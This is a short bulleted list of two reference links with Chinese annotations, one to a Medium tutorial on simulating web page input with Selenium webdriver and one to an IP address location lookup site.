- <https://medium.com/marketingdatascience/selenium%E6%95%99%E5%AD%B8-%E4%B8%80-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8webdriver-send-keys-988816ce9bed> (使用webdriver模拟网页操作）
- <https://chaipip.com/>（ip地址位置查询）
